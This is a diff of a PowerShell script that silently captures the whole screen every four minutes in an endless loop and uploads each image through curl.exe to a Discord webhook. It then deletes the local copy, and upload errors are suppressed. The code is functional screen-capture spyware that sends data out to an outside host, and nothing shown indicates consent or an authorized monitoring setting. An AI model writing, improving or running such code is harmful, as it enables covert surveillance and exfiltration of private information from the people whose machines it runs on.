@@ -11,45 +11,33 @@ function Take-Screenshot {
     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
     $screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
     $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
-    
+  
     $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-    
+  
     $tempFile = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
     $screenshot.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
-    
+  
     $graphics.Dispose()
     $screenshot.Dispose()
-    
+  
     return $tempFile
 }
 
 function Send-ToDiscord {
     param([string]$filePath)
-    
-    $fileName = Split-Path $filePath -Leaf
-    $fileBin = [System.IO.File]::ReadAllBytes($filePath)
-    
-    $boundary = "----Boundary$(Get-Random)"
-    
-    $bodyStart = @"
---$boundary
-Content-Disposition: form-data; name="file"; filename="$fileName"
-Content-Type: image/png
 
-"@
-    $bodyEnd = @"
-
---$boundary--
-"@
-
-    $body = [System.Text.Encoding]::UTF8.GetBytes($bodyStart) + $fileBin + [System.Text.Encoding]::UTF8.GetBytes($bodyEnd)
-    
     try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" | Out-Null
-    } catch {
+        # Best method for Windows PowerShell 5.1 - using curl.exe
+        curl.exe -s -F "file=@$filePath" $webhookUrl | Out-Null
+        
+        # Optional: Add username/content
+        # curl.exe -s -F "payload_json={\`"username\`":\`"Screenshot Bot\`"}" -F "file=@$filePath" $webhookUrl | Out-Null
+    }
+    catch {
         # Silently fail
     }
-    
+
+    # Cleanup
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
 
@@ -59,9 +47,8 @@ Write-Host "Starting silent screenshot every 4 minutes..." -ForegroundColor Gree
 while ($true) {
     $screenshotPath = Take-Screenshot
     Send-ToDiscord -filePath $screenshotPath
-    
-    # Optional: Show progress in console (you can remove this line for full silence)
+
     Write-Host "$(Get-Date -Format 'HH:mm:ss') - Screenshot sent" -ForegroundColor Gray
-    
-    Start-Sleep -Seconds (4 * 60)   # 4 minutes
+
+    Start-Sleep -Seconds (4 * 60)  # 4 minutes
 }
